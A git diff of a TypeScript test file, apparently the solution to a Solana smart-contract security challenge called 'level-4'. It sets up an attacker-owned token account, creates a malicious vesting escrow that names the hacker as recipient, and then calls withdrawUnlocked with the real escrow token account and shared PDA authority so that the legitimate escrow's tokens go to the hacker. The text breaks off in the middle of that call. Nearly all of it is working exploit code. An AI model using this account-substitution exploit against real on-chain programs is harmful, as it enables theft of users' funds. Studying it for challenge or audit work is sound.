@@ -40,80 +40,72 @@ describe("level-4", async () => {
   const recipient =  web3.Keypair.generate();
   const program = anchor.workspace.Level4 as anchor.Program<Level4>;
   const attackEscrow = web3.Keypair.generate();
+  const attackEscrowTokenAccount = web3.Keypair.generate();
+  console.log(`Attack Escrow Token Account PubKey -> ${attackEscrowTokenAccount.publicKey}`);
 
   let ESCROW_PDA: any;
   let ATTACK_ESCROW_ATA: any;
   let HACKER_TA: any;
+  let ATTACK_ESCROW_TA: any;
+  let MALICIOUS_ESCROW: any;
+  let MALICIOUS_ESCROW_RECIPIENT: any;
+  let LEGIT_ESCROW_RECIPIENT: any;
 
 
   before("Setup", async () => {
     await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
     await airdrop(provider.connection, attackEscrow.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
     await airdrop(provider.connection, recipient.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
-
+  
+    const attackEscrowTokenAccount = web3.Keypair.generate();
+    console.log(`Attack Escrow Token Account PubKey -> ${attackEscrowTokenAccount.publicKey}`);
+  
     const hackerTokenAccountInfo = await provider.connection.getAccountInfo(HACKER_TOKEN_ACCOUNT);
     const senderTokenAccountInfo = await provider.connection.getAccountInfo(SENDER_TOKEN_ACCOUNT);
     const escrowTokenAccountInfo = await provider.connection.getAccountInfo(ESCROW_TOKEN_ACCOUNT);
     console.log("Hacker Token Account owner:", hackerTokenAccountInfo?.owner.toBase58());
     console.log("Hacker public key:", hacker.publicKey.toBase58());
-    console.log("Sender token account owner:", senderTokenAccountInfo?.owner.toBase58())
-    console.log("Escrow token account owner:", escrowTokenAccountInfo?.owner.toBase58())
-
-    const hackerTokenAccount = await spl.getOrCreateAssociatedTokenAccount(
-        provider.connection,
-        hacker,
-        USDC,
-        hacker.publicKey,
-        false,
-        'confirmed',
-        { commitment: 'confirmed' },
-        TOKEN_2022_PROGRAM_ID,
-        ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-    console.log("Created new hacker token account:", hackerTokenAccount.address.toBase58());
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    HACKER_TA = hackerTokenAccount.address;
-    console.log("HACKER_TA:", HACKER_TA.toBase58());
-
-
-    
+    console.log("Sender token account owner:", senderTokenAccountInfo?.owner.toBase58());
+    console.log("Escrow token account owner:", escrowTokenAccountInfo?.owner.toBase58());
+  
     [ESCROW_PDA] = await web3.PublicKey.findProgramAddressSync(
       [Buffer.from("ESCROW_PDA_AUTHORITY")],
       program.programId
     );
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    console.log(`Escrow PDA -> ${ESCROW_PDA}`)
+    console.log(`Escrow PDA -> ${ESCROW_PDA}`);
     const escrowPdaInfo = await provider.connection.getAccountInfo(ESCROW_PDA);
     console.log("Escrow PDA owner:", escrowPdaInfo?.owner.toBase58());
-
-    const attackEscrowAta =  await spl.getAssociatedTokenAddress(
+  
+    // Create the account
+    const minRent = await provider.connection.getMinimumBalanceForRentExemption(spl.AccountLayout.span);
+    const createAccountIx = web3.SystemProgram.createAccount({
+      fromPubkey: hacker.publicKey,
+      newAccountPubkey: attackEscrowTokenAccount.publicKey,
+      space: spl.AccountLayout.span,
+      lamports: minRent,
+      programId: spl.TOKEN_2022_PROGRAM_ID,
+    });
+  
+    // Initialize the token account
+    const initAccountIx = spl.createInitializeAccountInstruction(
+      attackEscrowTokenAccount.publicKey,
       USDC,
-      attackEscrow.publicKey,
-      false,
-      spl.TOKEN_2022_PROGRAM_ID,
-      spl.ASSOCIATED_TOKEN_PROGRAM_ID
+      hacker.publicKey,
+      spl.TOKEN_2022_PROGRAM_ID
     );
-
-    const tx = new anchor.web3.Transaction().add(
-      spl.createAssociatedTokenAccountInstruction(
-        hacker.publicKey, // payer
-        attackEscrowAta, // ata
-        ESCROW_PDA, // authority
-        USDC, // mint
-        spl.TOKEN_2022_PROGRAM_ID,
-        spl.ASSOCIATED_TOKEN_PROGRAM_ID
-      )
-    );
-
-    await anchor.web3.sendAndConfirmTransaction(provider.connection, tx, [hacker]);
-
-    // Verify the ATA was created
-    const attackEscrowAtaPubKey =  new web3.PublicKey(attackEscrowAta)
-    console.log(`Attack Escrow ATA PubKey -> ${attackEscrowAtaPubKey}`)
-    const attackEscrowTokenAccountInfo = await provider.connection.getAccountInfo(ESCROW_TOKEN_ACCOUNT);
-    console.log(`Attack Escrow ATA Owner -> ${attackEscrowTokenAccountInfo?.owner.toBase58()}`)
-    ATTACK_ESCROW_ATA = attackEscrowAtaPubKey
-
+  
+    // Send the transaction
+    const transaction = new anchor.web3.Transaction()
+      .add(createAccountIx)
+      .add(initAccountIx);
+    const signature = await provider.sendAndConfirm(transaction, [hacker, attackEscrowTokenAccount]);
+    console.log('Attack Escrow Token Account created and initialized. Signature:', signature);
+  
+    // Verify the token account was created
+    const attackEscrowTokenAccountInfo = await provider.connection.getAccountInfo(attackEscrowTokenAccount.publicKey);
+    console.log(`Attack Escrow Token Account Owner -> ${attackEscrowTokenAccountInfo?.owner.toBase58()}`);
+    ATTACK_ESCROW_TA = attackEscrowTokenAccount.publicKey;
+  
   });
 
 
@@ -123,11 +115,19 @@ describe("level-4", async () => {
   // | | | | | | | | | | | | | | | | | | | | |
   // v v v v v v v v v v v v v v v v v v v v v
 
+  it("Inspect legit escrow", async () => {  
+    const escrow = await program.account.escrow.fetch(ESCROW);
+    console.log(escrow);
+    LEGIT_ESCROW_RECIPIENT =  escrow.recipient
+  });
+
   it("Initialize Malicious Escrow", async () => {
 
+    // Ensure ATTACK_ESCROW_TA is properly set
+    console.log("ATTACK_ESCROW_TA:", ATTACK_ESCROW_TA.toBase58());
 
-    const hack = await program.methods.initVesting(
-      recipient.publicKey, //recipient
+    const init = await program.methods.initVesting(
+      hacker.publicKey, //recipient
       new anchor.BN('1000'), //amount
       new anchor.BN('0'), //start_at
       new anchor.BN('2'), //end_at
@@ -135,33 +135,52 @@ describe("level-4", async () => {
     )
     .accounts({
       sender: hacker.publicKey,
-      senderTokenAccount: HACKER_TA,
+      senderTokenAccount: HACKER_TOKEN_ACCOUNT,
       escrow: attackEscrow.publicKey,
-      escrowTokenAccount: ATTACK_ESCROW_ATA,
+      escrowTokenAccount: ATTACK_ESCROW_TA,
       mint: USDC,
       tokenProgram: TOKEN_2022_PROGRAM_ID,
       systemProgram: web3.SystemProgram.programId,
     })
-    .signers([hacker])
+    .signers([hacker, attackEscrow])
     .rpc();
     await new Promise(resolve => setTimeout(resolve, 2000));
-    console.log(hack)
+    console.log("Initialization transaction:", init);
+
+    // Fetch the escrow account to verify it was created
+    const escrowAccount = await program.account.escrow.fetch(attackEscrow.publicKey);
+    console.log("Escrow account:", escrowAccount);
+    console.log("Escrow recipient:", escrowAccount.recipient);
+
+    MALICIOUS_ESCROW = attackEscrow.publicKey
+    MALICIOUS_ESCROW_RECIPIENT = escrowAccount.recipient
 
   });
 
-  it("Inspect escrow", async () => {  
-    const escrow = await program.account.escrow.fetch(ESCROW);
-    console.log(escrow);
+  it("Inspect malicious escrow", async () => {  
+    const escrow = await program.account.escrow.fetch(MALICIOUS_ESCROW);
+    console.log("Malicious escrow ->", escrow);
   });
 
   it ("Withdraw", async () => {
+
+    console.log("Accounts being used:");
+    console.log("MALICIOUS_ESCROW_RECIPIENT:", MALICIOUS_ESCROW_RECIPIENT.toBase58());
+    console.log("HACKER_TOKEN_ACCOUNT:", HACKER_TOKEN_ACCOUNT.toBase58());
+    console.log("attackEscrow.publicKey:", attackEscrow.publicKey.toBase58());
+    console.log("ESCROW_TOKEN_ACCOUNT:", ESCROW_TOKEN_ACCOUNT.toBase58());
+    console.log("ESCROW_PDA:", ESCROW_PDA.toBase58());
+    console.log("USDC:", USDC.toBase58());
+    console.log("hacker.publicKey:", hacker.publicKey.toBase58());
+  
+
     const withdraw = await program.methods.withdrawUnlocked()
     .accounts({
       recipient: hacker.publicKey,
-      recipientTokenAccount: HACKER_TA,
-      escrow: attackEscrow.publicKey,
-      escrowTokenAccount: ATTACK_ESCROW_ATA,
-      escrowPdaAuthority: ESCROW,
+      recipientTokenAccount: HACKER_TOKEN_ACCOUNT,
+      escrow: MALICIOUS_ESCROW,
+      escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
+      escrowPdaAuthority: ESCROW_PDA,
       mint: USDC,
       tokenProgram: TOKEN_2022_PROGRAM_ID,
       systemProgram: web3.SystemProgram.programId
